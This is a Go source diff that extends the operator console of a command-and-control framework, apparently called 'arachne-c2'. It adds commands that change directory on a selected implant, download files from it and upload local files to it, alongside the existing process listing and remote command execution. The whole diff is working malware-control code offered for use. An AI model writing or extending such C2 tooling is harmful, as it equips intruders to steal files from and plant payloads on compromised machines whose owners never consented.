@@ -6,10 +6,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
-
-	"google.golang.org/protobuf/proto"
-
-	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
+	"time"
 )
 
 func (o *Operator) RunCLI() {
@@ -49,7 +46,11 @@ func (o *Operator) RunCLI() {
 			fmt.Println("  select <idx>      — select implant by index")
 			fmt.Println("  ps                — list processes on selected implant")
 			fmt.Println("  ls <path>         — list directory")
+			fmt.Println("  cd <path>         — change directory")
+			fmt.Println("  pwd               — print working directory")
 			fmt.Println("  exec <cmd> [args] — execute command (with output)")
+			fmt.Println("  download <path>   — download file from implant")
+			fmt.Println("  upload <src> <dst> — upload file to implant")
 			fmt.Println("  help              — this help")
 			fmt.Println("  exit              — quit")
 
@@ -107,6 +108,67 @@ func (o *Operator) RunCLI() {
 				fmt.Printf("error: %v\n", err)
 			} else {
 				fmt.Println("command sent")
+			}
+
+		case "cd":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			path := "."
+			if len(args) > 0 {
+				path = args[0]
+			}
+			if err := o.Cd(selected.PeerID, path); err != nil {
+				fmt.Printf("error: %v\n", err)
+			} else {
+				fmt.Println("command sent")
+			}
+
+		case "pwd":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			if err := o.Pwd(selected.PeerID); err != nil {
+				fmt.Printf("error: %v\n", err)
+			} else {
+				fmt.Println("command sent")
+			}
+
+		case "download":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			if len(args) == 0 {
+				fmt.Println("usage: download <path>")
+				continue
+			}
+			if err := o.Download(selected.PeerID, args[0]); err != nil {
+				fmt.Printf("error: %v\n", err)
+			} else {
+				fmt.Println("download command sent")
+			}
+
+		case "upload":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			if len(args) < 2 {
+				fmt.Println("usage: upload <src> <dst>")
+				continue
+			}
+			data, err := os.ReadFile(args[0])
+			if err != nil {
+				fmt.Printf("read %s: %v\n", args[0], err)
+				continue
+			}
+			if err := o.Upload(selected.PeerID, args[1], data); err != nil {
+				fmt.Printf("error: %v\n", err)
+			} else {
+				fmt.Printf("uploaded %d bytes to %s\n", len(data), args[1])
 			}
 
 		case "exec", "execute":
